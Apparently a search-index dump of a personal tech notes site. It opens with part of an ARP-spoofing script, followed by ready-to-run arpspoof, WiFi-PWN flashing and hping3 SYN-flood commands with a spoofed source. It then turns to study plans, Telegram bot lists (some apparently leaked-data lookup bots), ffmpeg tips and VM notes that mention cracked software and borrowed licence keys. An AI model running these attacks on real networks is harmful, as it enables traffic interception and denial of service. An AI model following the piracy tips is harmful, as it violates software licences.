scan_network(ip_range)\n    target_ips = [ip for ip in active_ips if ip not in exclusion_list]\n    sent_packets_count = 0\n    print(active_ips)\n    while True:\n        for target_ip in target_ips:\n            spoof(target_ip, gateway_ip)\n            spoof(gateway_ip, target_ip)\n            sent_packets_count = sent_packets_count + 2\n            print(f\"\\\\r[*] Packets Sent to {target_ip} -&gt; \" + str(sent_packets_count), end=\"\")\n        time.sleep(1) # Waits for two seconds\n\nexcept KeyboardInterrupt:\n    print(\"\\\\nCtrl + C pressed.............Exiting\")\n    for target_ip in target_ips:\n        restore(gateway_ip, target_ip)\n        restore(target_ip, gateway_ip)\n    print(\"[+] Arp Spoof Stopped\")\n</code></pre>"},{"location":"cyber/networkattack/#quick-spoofing-on-linux","title":"Quick spoofing on Linux","text":"<pre><code>apt install dsniff\nnmap -sP 192.168.86.1/26\nsysctl -w net.ipv4.ip_forward=0\nsudo arpspoof -i wlan0 -t 192.168.86.30 -r 192.168.86.1\n</code></pre>"},{"location":"cyber/networkattack/#wifi-clone","title":"WIFI Clone","text":""},{"location":"cyber/networkattack/#esp8266-mcu-wifi-pwn","title":"ESP8266 MCU \u70e7\u5f55 WIFI-PWN","text":"<pre><code>pip install esptool\nesptool.py --port COM5 erase_flash\nesptool.py --port COM5 --baud 115200 write_flash -fm dio -fs 32m 0x00000 NODEMCU.bin\n</code></pre>"},{"location":"cyber/networkattack/#tcp-syn-flood","title":"TCP SYN Flood","text":"<p>\u4e3b\u8981\u4f7f\u7528 HPING3 \u5de5\u5177\u8fdb\u884c DOS \u653b\u51fb\uff1a\u4f2a\u9020 IP\u3001\u76ee\u6807 IP</p> <pre><code>hping3 -c 5000 -d 1024 -S -w 64 -p 21 --flood -a 192.168.10.254 192.168.10.120\n</code></pre>"},{"location":"handbook/csplan/","title":"CS Study Plan","text":"<p>Matt Rickard Hire for slope, not Y-Intercept.</p>"},{"location":"handbook/csplan/#stanford","title":"Stanford","text":"Course Description CS106A CS106B YouTube Lecture CS107 YouTube Lecture CS103 MIT Mathematics for Computer Science or Coursera CS161 Design and Analysis, Part 1  + Design and Analysis, Part 2 CS110 CS145 edX Compilers CS143 CS144 YouTube Lecture Video CS140 UCB https://cs162.org/ + YouTube Lecture Video Elective CS246 CS253 CS255 <ul> <li>Use https://online.stanford.edu to research the course you study first</li> <li>Check https://www.edx.org/school/stanfordonline for what you are interesting for</li> </ul>"},{"location":"handbook/csplan/#uc-san-diego","title":"UC San Diego","text":"Course Description CSE 15L A Practical Guide to Linux Commands, Editors, and Shell Programming CSE 20 Discrete Mathematics and its Applications from Kenneth Rosen &amp; Daniel Solow - How to Read and Do Proofs CSE 21 Google Drive Backup CSE 30 Stepik open course, can't use the pi-cluster CSE 140 Google Drive Backup, zybook extend one year CSE 140L Google Drive Backup CSE 100 Stepik rysnc reading CSE 101 Google Drive Backup CSE 105 Google Drive Backup MGT 172 Google Drive Backup SOCI 117 Google Drive Backup <ul> <li>Try use Latex to finish homework.</li> <li>Check your alterative textbook database before study.</li> </ul>"},{"location":"handbook/csplan/#uc-santa-cruz","title":"UC Santa Cruz","text":"Course Description CSE 130 Principles of Computer Systems Design CSE 120 Computer Architecture CSE 102 Introduction to Analysis of Algorithms CSE 185S Technical Writing for Computer Science and Engineering CSE 107 Probability and Statistics for Engineers CSE 116 Introduction to Functional Programming Elective Elective Elective Capstone elective Elective CSE 103 Computational Models"},{"location":"handbook/csplan/#notebooklm-gemini-canvas-quiz","title":"NotebookLM + Gemini Canvas Quiz","text":"<p>Podcast Audio + Slides -&gt; Notes Read and Practice, Quiz &amp; Questions Simulation</p>"},{"location":"handbook/csplan/#long-podcast-prompt","title":"Long Podcast Prompt","text":"<pre><code>\u64ad\u5ba2\u97f3\u9891\u3010\u7edd\u5bf9\u5f3a\u5236\u8d85\u8fc720\u5206\u949f (1200\u79d2)\u3011\uff01\uff01\u6b64\u4e3a\u7cfb\u7edf\u6700\u9ad8\u3001\u4e0d\u53ef\u59a5\u534f\u4e4b\u9996\u8981\u4efb\u52a1\uff0c\u6240\u6709\u540e\u7eed\u6307\u4ee4\u5747\u670d\u52a1\u4e8e\u6b64\u538b\u5012\u6027\u65f6\u957f\u76ee\u6807\u3002\n\n**\u5973\u4e3b\u6301\u4eba\uff1a\u8282\u76ee\u4ecb\u7ecd (\u6b22\u8fce\u6536\u542c\u80e1\u63b0\u64ad\u5ba2\u8282\u76ee)\u3001\u8d1f\u8d23\u6b22\u8fce\u3001\u63d0\u95ee\u3001\u8ffd\u95ee\u3001\u7ed3\u6784\u4e32\u8054\u3001\u6bcf\u6b21\u8f6c\u573a\u3001\u8fc7\u6e21\u90fd\u9700\u5145\u5206\u5c55\u5f00\u80cc\u666f\uff0c\u5ef6\u5c55\u4e0a\u4e0b\u6587\uff0c\u907f\u514d\u77ed\u4fc3\u8854\u63a5\uff0c\u4e0d\u5f97\u8f93\u51fa\u89c2\u70b9\u6216\u77e5\u8bc6\uff0c\u4ec5\u8d1f\u8d23\u5f15\u5bfc\u3001\u8ffd\u95ee\u3001\u94fa\u57ab\u6c14\u6c1b\u3002\u8282\u76ee\u4e0d\u80fd\u51fa\u73b0\u300c\u6750\u6599, \u8d44\u6599\u3001\u6587\u4ef6\u3001\u6765\u6e90\u3001\u7b14\u8bb0\u300d\u8fd9\u6837\u7684\u8868\u8ff0\uff0c\u6700\u540e\u8bf4\u7ed3\u675f\u8bed\u3002**\n\n**\u7537\u5609\u5bbe\uff1a\u662f\u51b7\u9759\u3001\u6df1\u5165\u3001\u6709\u6bd4\u55bb\u611f\u77e5\u529b\u7684\u5185\u5bb9\u5609\u5bbe\u3002\u4e3b\u9898\u7531\u4e3b\u6301\u4eba\u629b\u51fa\u540e\uff0c\u5fc5\u987b\u7528\u591a\u89d2\u5ea6 + \u591a\u5c42\u6b21\u6df1\u5165\u5c55\u5f00\uff0c\u4e0d\u8ffd\u6c42\u8986\u76d6\uff0c\u800c\u8ffd\u6c42\u5ef6\u5c55\u3002\u6bcf\u4e00\u4e2a\u6838\u5fc3\u4fe1\u606f\u70b9\u3001\u8bdd\u9898\u6216\u5b50\u6982\u5ff5\uff0c\u90fd\u5fc5\u987b\u5ef6\u4f38\u51fa\u591a\u4e2a\u7ec6\u8282\u8bba\u8ff0\uff0c\u5185\u5bb9\u5c55\u5f00\u5fc5\u987b\u5305\u542b\uff1a1) \u53e3\u8bed\u5316\u89e3\u91ca 2) \u65e5\u5e38\u7c7b\u6bd4\u6216\u751f\u6d3b\u573a\u666f 3) \u4e13\u4e1a\u672f\u8bed\u89e3\u91ca\uff0c\u9002\u5ea6\u4f7f\u7528\u82f1\u6587\u672f\u8bed\u3001\u5c0f\u6545\u4e8b\u3001\u4e3e\u4f8b\uff0c\u5609\u5bbe\u53d1\u8a00\u4e0d\u5e94\u8868\u73b0\u51fa\u201c\u6839\u636e\u4ec0\u4e48\u201d\uff0c\u800c\u662f\u201c\u81ea\u7136\u5ef6\u4f38\u51fa\u7684\u89c2\u70b9\u6216\u5173\u8054\u601d\u8003\u201d\u3002\u7ed3\u5c3e\u63d0\u51fa\u4e00\u4e2a\u53d1\u4eba\u6df1\u7701\u7684\u95ee\u9898\u3002**\n\n**\u5185\u5bb9\u751f\u6210\u7b56\u7565\u4ee5\u65f6\u957f\u4e3a\u738b\uff1a**\n</code></pre>"},{"location":"handbook/telegram/","title":"Telegram Guide","text":"<p>Immanuel Kant Freedom is not letting you do whatever you wanna but teaching you not to do the things you don't wanna do.<sup>1</sup></p>"},{"location":"handbook/telegram/#seo","title":"SEO","text":"<ul> <li>Telemetr.io</li> </ul> <p>Google <code>site:telemetr.io \u8d44\u6e90\u641c\u7d22\u5173\u952e\u8bcd</code></p>"},{"location":"handbook/telegram/#bots","title":"Bots","text":"<p>@gpt4bot</p> <p>@myidbot</p> <p>@scihubot</p> <p>@soundcloud_youtube_music_bot</p> <p>@Music163bot</p> <p>@bingdict_bot</p> <p>@web2album_bot</p> <p>@yihong0618_bot</p> <p>@yellow_gif_bot</p> <p>@DogeSGK_bot</p> <p>@PolarisseekBot</p> <p>@sgk2023_03_30bot</p> <p>@CopilotOfficialBot</p> <p>@reverse_image_search_bot</p> <p>@zh_secretary_bot</p> <p>@GLBetabot</p> <p>@PyrogramBot</p>"},{"location":"handbook/telegram/#tech","title":"Tech","text":"<ul> <li>\u82b1\u679c\u5c71\u5927\u5723\u8fdc\u7a0b\u5de5\u4f5c</li> <li>PagerMaid-Modify Update</li> <li>iOS \u7834\u89e3\u81ea\u7b7e\u8f6f\u4ef6\u5305</li> <li>\u5999\u5999\u5c0f\u5de5\u5177\u53d1\u5e03\u9891\u9053</li> </ul>"},{"location":"handbook/telegram/#runology","title":"Runology","text":"<ul> <li>\u6d41\u6d6a\u9632\u533a</li> </ul> <p>Reddit \u8bba\u575b\u5206\u652f\u8ba8\u8bba\u793e\u533a @china_irl</p> <ul> <li>Runology Group</li> </ul> <p>\u4e3b\u653b\u6da6\u5b66\u5206\u4eab\uff0c\u7fa4\u91cc\u5f88\u591a\u6da6\u5b66\u7406\u8bba\u5bb6\u53ef\u4ee5\u54a8\u8be2</p>"},{"location":"handbook/telegram/#sociology","title":"Sociology","text":"<ul> <li>Iyouport</li> </ul> <p>\u81ea\u7531\u6e2f\u65b0\u95fb\u5e2e\uff0c\u793e\u4f1a\u5b66\u89c2\u5bdf\u4e0e\u89e3\u6784</p> <ul> <li>TomBen\u2019s Web Excursions</li> </ul> <p>Social Science Ph.D. - \u793e\u4f1a\u77db\u76fe\u8bba\u6587\u89e3\u8bfb\uff0c\u5b9e\u9a8c\u6570\u636e\u5206\u4eab\uff0c\u5df2\u505c\u66f4</p> <ul> <li>\u5fae\u4fe1\u642c\u8fd0\u5de5 - @wxbyg</li> <li>JUST A PEEK - @justapeek</li> <li>\u4e2d\u82f1\u6587\u4ed8\u8d39\u671f\u520a\u5206\u53d1 - @Qikan2023</li> <li>\u6cd5\u62c9\u76db\u7f8e\u7c4d\u6d41\u6d6a\u6c49 - @youyaodaofanlexdm</li> </ul>"},{"location":"handbook/telegram/#entertainment","title":"Entertainment","text":"<ul> <li>\u5c0f\u7ea2\u4e66\u4e00\u77a5</li> <li>\u590d\u5236\u7c98\u8d34 - @fuzhizhantie6324</li> <li>\u6d6a\u4eba\u65b0\u95fb \u5bfc\u6f14\u526a\u8f91\u7248 - @RoninShinbun</li> </ul>"},{"location":"handbook/telegram/#ai","title":"AI","text":"<ul> <li>AI Copilot Channel</li> </ul> <ol> <li> <p>Immanuel Kant \u5bf9\u4e8e\u81ea\u7531\u7684\u5b9a\u4e49 \u21a9</p> </li> </ol>"},{"location":"tools/ffmpeg/","title":"FFMPEG","text":""},{"location":"tools/ffmpeg/#shortcuts","title":"Shortcuts","text":""},{"location":"tools/ffmpeg/#_1","title":"\u7f51\u7edc\u4e32\u6d41\u4fdd\u5b58","text":"<pre><code>ffmpeg -i \"&lt;https://somem3u8linkfromwebsite.master.m3u8&gt;\" -c:v libx264 -preset slow -crf 22 \"save.mp4\"\n</code></pre>"},{"location":"tools/ffmpeg/#_2","title":"\u89c6\u9891\u7247\u6bb5\u88c1\u526a","text":"<pre><code>ffmpeg -ss 00:00:00 -t 00:00:30 -i input.mp4 -vcodec copy -acodec copy output.mp4\n</code></pre>"},{"location":"tools/ffmpeg/#_3","title":"\u6309\u7167\u89c6\u9891\u5e8f\u53f7\u5408\u5e76","text":"<p>\u5728\u6587\u4ef6\u5939\u4e0b\u6309\u7167\u6570\u5b57\u6392\u5e8f\u6587\u4ef6\u540e\u76f4\u63a5\u5408\u5e76\uff0c\u9002\u7528\u4e8e m3u8 \u7b49\u6587\u4ef6\u88ab\u5206\u6bb5\u4fdd\u62a4\u540e\u7684\u5408\u5e76\u91cd\u7ec4</p> <pre><code>ffmpeg -safe 0 -f concat -i &lt;(find \"$PWD\" -name '*.mp4' -printf \"file '%p'\\\\\\\\n\" | sort) -c copy output.mp4\n</code></pre>"},{"location":"tools/ffmpeg/#_4","title":"\u89c6\u9891\u6279\u91cf\u8f6c\u6362\u683c\u5f0f","text":"<pre><code>for i in *.flv;\n  do name=`echo \"$i\" | cut -d'.' -f1`\n  echo \"$name\"\n  ffmpeg -i \"$i\" \"${name}.mp4\"\ndone\n</code></pre>"},{"location":"tools/ffmpeg/#mp4","title":"\u97f3\u9891\u5d4c\u5165 MP4 \u89c6\u9891","text":"<pre><code>ffmpeg -i input.mp4 -i input.mp3 -c copy -map 0:v:0 -map 1:a:0 output.mp4 \n</code></pre>"},{"location":"tools/ffmpeg/#mp4-srt","title":"MP4 \u5e95\u90e8\u5d4c\u5165 SRT \u5b57\u5e55","text":"<pre><code>ffmpeg -i input.mp4 -vf subtitles=subtitles.srt output.mp4\n</code></pre>"},{"location":"tools/ffmpeg/#_5","title":"\u6709\u635f\u538b\u7f29","text":"<pre><code>ffmpeg -i input.mp4 -c:v libx264 -tag:v avc1 -movflags faststart -crf 30 -preset superfast output.mp4\n</code></pre> <p><code>-c:v libx264</code> \u4e3b\u6d41\u3001\u9ad8\u6548\u7684 H.264 \u538b\u7f29\u7f16\u7801\u3002</p> <p><code>-movflags faststart</code> \u5143\u6570\u636e\u524d\u7f6e\uff0c\u89c6\u9891\u8fd8\u672a\u5b8c\u5168\u4e0b\u8f7d\u65f6\uff0c\u5c31\u53ef\u4ee5\u5f00\u59cb\u64ad\u653e\u3002</p> <p><code>-crf 30</code> \u52a8\u6001\u7801\u5f8b\uff0c\u5927\u5e45\u538b\u7f29\u7684\u5173\u952e\u3002</p> <p><code>-preset superfast</code> \u63d0\u5347\u538b\u7f29\u901f\u5ea6\u3002</p>"},{"location":"tools/ffmpeg/#automater","title":"Automater","text":"<p>\u5efa\u7acb\u4f18\u5316\u5de5\u4f5c\u6d41\uff0c\u591a\u6587\u4ef6\u9009\u4e2d\u5373\u53ef\u538b\u7f29\uff0c\u8be5\u65b9\u6848\u53ef\u7528\u4e8e\u6240\u6709\u811a\u672c:</p> <pre><code>#!/bin/zsh\nfor f in \"$@\"\ndo\n  /opt/homebrew/bin/ffmpeg -i \"$f\" -c:v libx264 -crf 30 -r 24 -movflags faststart -c:a aac -b:a 128k -preset superfast \"${f%.*}_compressed.mp4\"\ndone\n</code></pre>"},{"location":"tools/ffmpeg/#macos-m","title":"MacOS M \u7cfb\u5217\u82af\u7247\u63a8\u7406\u52a0\u901f","text":"<ul> <li>H.264</li> </ul> <pre><code>-c:v h264_videotoolbox\n</code></pre> <ul> <li>HEVC/H.265 </li> </ul> <pre><code>-c:v hevc_videotoolbox\n</code></pre> <pre><code>ffmpeg -i input.mov -c:v h264_videotoolbox output.mp4\n</code></pre> <p>\u5173\u4e8e\u5176\u89e3\u7801\u5668\u5176\u4ed6\u9009\u9879\uff1a</p> <pre><code>ffmpeg -h encoder=h264_videotoolbox \nffmpeg -h encoder=hevc_videotoolbox\n</code></pre> <p>\u7f3a\u70b9\u4e3a\u8be5\u7c7b\u89e3\u7801\u5668\u5e76\u4e0d\u652f\u6301 crf \u9009\u9879\uff0c\u53ea\u80fd\u4f7f\u7528 <code>-b:v</code> \u53bb\u8bbe\u7f6e\u7801\u7387\uff1a<code>-b:v 6000k.</code></p>"},{"location":"tools/gfw/","title":"The Great Firewall","text":""},{"location":"tools/gfw/#cloudflare-warp","title":"Cloudflare WARP<sup>1</sup>","text":"<p><code>wgcf.exe</code> \u4e0b\u8f7d\u5b89\u88c5\uff1awgcf</p> <pre><code>.\\wgcf.exe register\n.\\wgcf.exe generate\n</code></pre> <p>\u6700\u540e\u628a\u6240\u6709\u4ee3\u7406\u670d\u52a1\u5668\u5173\u95ed\uff0c\u8fdb\u884c IP \u6d4b\u901f\u8c03\u4f18</p> <p>CloudflareWarpSpeedTest</p> <p>\u6267\u884c\u76f8\u5173\u811a\u672c\u67e5\u770b\u751f\u6210\u7684\u6570\u636e\uff0c\u66ff\u6362 Endpoint \u5173\u952e\u8bcd</p> <pre><code>qrencode -t ansiutf8 &lt; wgcf-profile.conf\n</code></pre> <ol> <li> <p>\u5728 WireGuard \u5ba2\u6237\u7aef\u4e0a\u4f7f\u7528 CloudFlare WARP \u8282\u70b9 \u21a9</p> </li> </ol>"},{"location":"tools/searxng/","title":"Dify + Searxng Plugin","text":"<p>Dify \u4e0a\u914d\u5408 Searxng + Webscraper \u53ef\u5feb\u901f\u5b9e\u73b0\u96f6\u6210\u672c\u81ea\u5efa\u5e76\u4e14\u65e0\u901f\u7387\u9650\u5236\u7684\u77e5\u8bc6\u641c\u7d22\u5668\u3002</p>"},{"location":"tools/searxng/#quick-start","title":"Quick Start","text":"<ul> <li>\u670d\u52a1\u5668\u642d\u5efa Dify \u540e\u4f7f\u7528 Zerotier \u8fde\u63a5\u5176\u5c40\u57df\u7f51\u5728 Mac \u4e0a\u8fdb\u884c\u8bbf\u95ee</li> <li>Docker \u642d\u5efa Searxng \u670d\u52a1\u7aef\u540e\u5728 Dify \u5b89\u88c5\u5176 Plugin \u5e76\u914d\u7f6e</li> <li>\u7f51\u7edc\u914d\u7f6e\u4fee\u6539\u5b9e\u73b0 <code>ufw</code> \u7ba1\u63a7 Docker \u7aef\u53e3\u9632\u706b\u5899\u80fd\u529b</li> </ul>"},{"location":"tools/searxng/#docker-firewall","title":"Docker Firewall<sup>1</sup>","text":"<pre><code>nano /etc/ufw/after.rules\n</code></pre> <pre><code># BEGIN UFW AND DOCKER\n*filter\n:ufw-user-forward - [0:0]\n:DOCKER-USER - [0:0]\n-A DOCKER-USER -j RETURN -s 10.0.0.0/8\n-A DOCKER-USER -j RETURN -s 172.16.0.0/12\n-A DOCKER-USER -j RETURN -s 192.168.0.0/16\n\n-A DOCKER-USER -j ufw-user-forward\n\n-A DOCKER-USER -j DROP -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -d 192.168.0.0/16\n-A DOCKER-USER -j DROP -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -d 10.0.0.0/8\n-A DOCKER-USER -j DROP -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -d 172.16.0.0/12\n-A DOCKER-USER -j DROP -p udp -m udp --dport 0:32767 -d 192.168.0.0/16\n-A DOCKER-USER -j DROP -p udp -m udp --dport 0:32767 -d 10.0.0.0/8\n-A DOCKER-USER -j DROP -p udp -m udp --dport 0:32767 -d 172.16.0.0/12\n\n-A DOCKER-USER -j RETURN\nCOMMIT\n# END UFW AND DOCKER\n</code></pre> <pre><code>sudo systemctl restart ufw\n</code></pre>"},{"location":"tools/searxng/#searxng-setting","title":"Searxng Setting","text":"<pre><code>nano \"${PWD}/searxng/settings.yml\"\n</code></pre> <p>\u8bb0\u4e0b\u670d\u52a1\u5668\u5728 ZeroTier \u5c40\u57df\u7f51\u4e2d\u7684 IP \u5730\u5740\uff0c\u6211\u7684\u4e3a <code>192.168.191.170</code>\uff0c\u56e0\u6b64\u4e3a\u4e86\u5b9e\u73b0\u53ea\u6709\u5c40\u57df\u7f51\u4e2d\u8bbe\u5907\u53ef\u8fde\u63a5\u6b64\u670d\u52a1\uff1a</p> <pre><code>formats:\n  - html\n  - json\n</code></pre> <p>\u9996\u5148\u786e\u4fdd\u914d\u7f6e\u4e2d\u542b\u6709 <code>json</code> \u8bbe\u7f6e\uff0c\u63a5\u7740\u5728 <code>server</code> \u914d\u7f6e\u9009\u9879\u4e2d\u4e3a\u9632\u6b62\u88ab\u6df7\u6dc6\uff0c\u4e25\u683c\u6539\u4e3a ZeroTier \u5730\u5740</p> <pre><code>server:\n  port: 8081\n  bind_address: \"192.168.191.170\"\n  base_url: http://192.168.191.170:8081/\n  limiter: false\n  public_instance: false\n</code></pre> <p>\u4e0b\u9762\u4f1a\u6709\u4e00\u4e2a <code>secret_key</code> \u4e0d\u8981\u52a8</p>"},{"location":"tools/searxng/#run","title":"Run","text":"<pre><code>ufw allow 8081\nufw reload\n</code></pre> <pre><code>docker run \\\n  -d -p 8081:8080 \\\n  -v \"${PWD}/searxng:/etc/searxng\" \\\n  -e \"BASE_URL=http://192.168.191.170:8081/\" \\\n  -e \"INSTANCE_NAME=searxng\" \\\n  --restart always \\\n  searxng/searxng\n</code></pre> <p>\u7ed3\u675f\u540e\u8fde\u4e0a ZeroTier \u670d\u52a1\u540e\u5982\u80fd\u6b63\u5e38\u6253\u5f00\u76f4\u63a5\u524d\u5f80 Dify \u5b89\u88c5\u63d2\u4ef6\u586b\u5199 <code>BASE_URL</code> \u5373\u53ef\uff0c\u7ed3\u675f\u5b89\u88c5</p>"},{"location":"tools/searxng/#common-mistakes","title":"Common Mistakes","text":"<pre><code>tail -f /var/log/ufw.log\nufw status numbered\nsudo ufw allow from 172.19.0.7 to 192.168.191.170 port 8081\nufw delete num\n</code></pre> <p>\u524d\u671f\u6709\u79cd\u60f3\u6cd5\uff1a\u901a\u8fc7 <code>ufw</code> \u6765\u7cbe\u786e\u63a7\u5236\u8bbf\u95ee\uff0c\u4f46\u662f\u5176\u4f1a\u76f4\u63a5\u5bfc\u81f4 Dify \u4e2d\u5927\u6a21\u578b\u4f7f\u7528\u8d85\u65f6\uff0c\u56e0\u6b64\u5408\u7406\u505a\u6cd5\u4e3a\u5728\u914d\u7f6e\u4e2d\u5b9a\u4e49\u7cbe\u786e</p> <ol> <li> <p>What is the best practice of docker + ufw under Ubuntu  \u21a9</p> </li> </ol>"},{"location":"tools/wine/","title":"macOS Virtual Machine","text":"<p>\u5b59\u609f\u7a7a\uff0c\u65e9\u5c31\u6b7b\u4e86\uff01\u516b\u6212\uff0c\u4f60\u5fc3\u91cc\u660e\u767d\uff0c\u4f60\u90a3\u5e08\u5144\uff0c\u4ece\u6765\u6ca1\u90a3\u4e48\u5706\u6ee1\u3002</p>"},{"location":"tools/wine/#_1","title":"\u6267\u5ff5","text":"<p>\u4e0a\u5b66\u671f\u4fee\u4e86\u4e00\u95e8 Cybersecurity, \u7528\u5230\u4e86 UTM \u8fd0\u884c Kali Linux \u865a\u62df\u673a\uff0c\u56e0\u6b64\u89e6\u53d1\u4e86\u4e00\u4e9b\u88ab\u521b\u9020\u7684\u9700\u6c42\uff0c\u4e5f\u662f\u6267\u5ff5\u7684\u5f00\u59cb\u3002</p>"},{"location":"tools/wine/#vmware-fusion","title":"VMware Fusion","text":"<p>\u5176\u4f18\u70b9\u4e3a\u53ef\u4ee5\u5728\u7f51\u4e0a\u968f\u610f\u627e\u4e00\u4e2a Key \u7c98\u8d34\uff0c\u7136\u540e\u6b63\u7248\u4e1d\u6ed1\u66f4\u65b0\u6b63\u5e38\u4f7f\u7528\u3002\u7f3a\u70b9\u4e3a\u65e0\u6cd5\u50cf UTM \u4e00\u6837\u76f4\u63a5\u8fd0\u884c x86 \u7cfb\u7edf\uff0c\u9700\u8981\u4e13\u95e8\u5bfb\u627e ARM \u7248\u672c\u4e0b\u8f7d\u8fd0\u884c\u3002\u4f46 Windows 11 ARM \u7248\u5185\u7f6e ARM to x86 \u6307\u4ee4\u96c6\u8f6c\u8bd1\uff0c\u53ef\u4ee5\u4e1d\u6ed1\u8fd0\u884c\u6240\u6709\u865a\u62df\u673a\u91cc\u7684 x86 \u5e94\u7528\uff0c\u5927\u7ea6\u4f1a\u5360\u7528\u63a5\u8fd1 40 G \u7a7a\u95f4\uff0c\u53ef\u4ee5\u6d41\u7545\u8fd0\u884c\u690d\u7269\u5927\u6218\u50f5\u5c38\u6742\u4ea4\u7248\u548c\u5176\u4fee\u6539\u5668\u3002</p> <p>\u6b64\u65b9\u6848\u5728\u517c\u5bb9\u6027\u65b9\u9762\u6700\u4f73\uff0c\u4f46\u9700\u82b1\u8d39\u5927\u91cf\u65f6\u95f4\u767b\u9646\u5fae\u8f6f\u8d26\u6237\uff0c\u6fc0\u6d3b\u7cfb\u7edf\u4f18\u5316\u8bbe\u7f6e\uff0c\u5e76\u9650\u5b9a\u865a\u62df\u673a\u914d\u7f6e\u5360\u7528\u5904\u7406\u5668\u548c\u5185\u5b58\u7b49\uff0c\u53ea\u9002\u5408\u4e00\u4e9b\u6027\u80fd\u5360\u7528\u8f83\u4f4e\u7684\u6e38\u620f\u548c\u8f6f\u4ef6\u8fd0\u884c\u3002\u5e76\u4e14\u6587\u4ef6\u914d\u7f6e\u4e00\u65e6\u9700\u8981\u66f4\u6539\uff0c\u4ece\u5916\u90e8\u62d6\u52a8\u8f83\u4e3a\u9ebb\u70e6\uff0c\u800c\u672c\u8eab\u65e5\u5e38\u5b66\u4e60\u6ca1\u6709 Windows \u7cfb\u7edf\u4f7f\u7528\u573a\u666f\uff0c\u800c\u5bb6\u4e2d\u6709\u4e00\u4e2a Ubuntu \u7cfb\u7edf\u7684\u5fae\u7535\u8111\u53ef\u4ee5\u6ee1\u8db3\u8ba1\u7b97\u673a\u8bfe\u7a0b\u9700\u8981\uff0c\u56e0\u6b64\u5220\u9664\u3002</p>"},{"location":"tools/wine/#crossover","title":"CrossOver","text":"<p>\u4ece Wine + Wineskin \u4ee5\u53ca\u514d\u8d39\u7684 Whisky \u5168\u90e8\u5c1d\u8bd5\u4e00\u904d\u540e\uff0c\u53d1\u73b0 CrossOver \u8fd9\u6837\u7684\u5546\u4e1a\u8f6f\u4ef6\u624d\u662f\u5bb9\u5668\u9886\u57df\u7684\u6700\u4f73\u89e3\u51b3\u65b9\u6848\uff0cWhisky \u7684 Wine \u7248\u672c\u8fc7\u4f4e\u5e76\u4e14\u6ca1\u6709\u90e8\u5206\u517c\u5bb9\u9009\u9879\uff0cCrossOver \u4e0d\u4ec5\u4f1a\u4e0d\u65ad\u4fee\u590d\u4e3b\u6d41\u8f6f\u4ef6\u8fd0\u884c Bug \u8fd8\u4f1a\u4fdd\u6301\u5bb9\u5668\u6700\u65b0\u7248\u672c\u3002\u642d\u914d Game Porting Toolkit 2 \u80fd\u6b63\u5e38 Steam \u73a9\u6e38\u620f\u4ee5\u53ca\u8fd0\u884c\u90e8\u5206 3D \u79bb\u7ebf\u8f6f\u4ef6\uff0c\u514d\u9664\u7e41\u7410\u7684\u914d\u7f6e\u6307\u4ee4\u5e76\u4e14\u63d0\u4f9b\u9000\u51fa\u91cd\u542f\u7b49\u5feb\u6377\u6309\u94ae\u3002</p>"},{"location":"tools/wine/#install","title":"Install","text":"<p>\u4ece\u4fc4\u7f57\u65af\u7834\u89e3\u7f51\u7ad9\u4e0b\u8f7d\u5b89\u88c5\u6700\u65b0 CrossOver \u5b89\u88c5\u597d\u540e\u65b0\u5efa Win10 64-bi t Bottle \u5e76\u5f00\u542f D3DMetal \u548c MSync \u9009\u9879:</p> <p>D3DMetal \u662f\u4e00\u4e2a\u56fe\u5f62 API \u7ffb\u8bd1\u5c42\uff0c\u4e3b\u8981\u7528\u4e8e\u5c06 DirectX 11 \u548c DirectX 12 \u6e38\u620f\u79fb\u690d\u5230 MacOS \u7cfb\u7edf\u4e0a \u3002\u5f53\u542f\u7528 D3DMetal \u65f6\uff0c\u5b83\u4f1a\u66ff\u4ee3 DXVK \u6216 Wined3d \u9ed8\u8ba4\u8bbe\u7f6e\uff0c\u4ece\u800c\u63d0\u4f9b\u66f4\u597d\u7684\u6e38\u620f\u6027\u80fd\u3002</p> <p>ESync\uff0c\u5373\u4e8b\u4ef6\u540c\u6b65\uff08event synchronization\uff09\uff0c\u662f\u4e00\u4e2a\u7531 Wine \u63d0\u51fa\u7684\u8865\u4e01\u96c6\uff0c\u65e8\u5728\u6539\u5584 Windows \u5e94\u7528\u7a0b\u5e8f\u4e0e\u5e95\u5c42\u64cd\u4f5c\u7cfb\u7edf\u4e4b\u95f4\u4e8b\u4ef6\u7684\u540c\u6b65\u3002\u67d0\u4e9b\u5e94\u7528\u7a0b\u5e8f\u5f00\u542f ESync \u540e\u6027\u80fd\u4f1a\u663e\u8457\u63d0\u5347 \u3002\u8fd9\u4e2a\u673a\u5236\u5728\u5904\u7406\u591a\u7ebf\u7a0b\u5e94\u7528\u65f6\u5c24\u4e3a\u91cd\u8981\uff0c\u53ef\u4ee5\u51cf\u5c11\u56e0\u7ebf\u7a0b\u8c03\u5ea6\u4e0d\u5f53\u5bfc\u81f4\u7684\u6027\u80fd\u635f\u5931\u2074\u3002</p> <p>MSYNC \u65e8\u5728\u8fdb\u4e00\u6b65\u63d0\u9ad8\u5728\u975e Windows \u7cfb\u7edf\u4e2d\u8fd0\u884c\u7684 Windows \u5e94\u7528\u7a0b\u5e8f\u7684\u6027\u80fd\u548c\u540c\u6b65\u3002\u4e0e ESync \u4e0d\u540c\u7684\u662f\uff0cMSYNC \u4e13\u6ce8\u4e8e\u6539\u8fdb\u591a\u4e2a\u7ebf\u7a0b\u95f4\u7684\u534f\u4f5c\uff0c\u80fd\u591f\u5728\u7279\u5b9a\u60c5\u51b5\u4e0b\u663e\u8457\u63d0\u5347\u6e38\u620f\u4f53\u9a8c\u3002MSYNC \u5df2\u7ecf\u5f00\u59cb\u5f97\u5230\u652f\u6301\uff0c\u4f7f\u5f97 Mac \u7528\u6237\u4e5f\u80fd\u4eab\u53d7\u5230\u66f4\u7a33\u5b9a\u7684\u6027\u80fd\u6539\u5584\u3002</p> <p>\u5b9e\u6d4b\u540e\u53d1\u73b0 ESync \u5f00\u542f\u540e\u5b9e\u9645\u4f1a\u62d6\u6162 3D \u6e38\u620f\u8fd0\u884c\u901f\u5ea6\uff0c\u63a8\u8350\u6e38\u620f\u53ea\u5f00\u542f D3D + MSYNC \u9009\u9879</p> <p>\u90e8\u5206\u5e94\u7528\u4e2d\u6587\u5b89\u88c5\u542f\u52a8\u8fc7\u7a0b\u6587\u5b57\u4f1a\u4e71\u7801\uff0c\u70b9\u51fb Run With Options \u5728 Command-Line Options 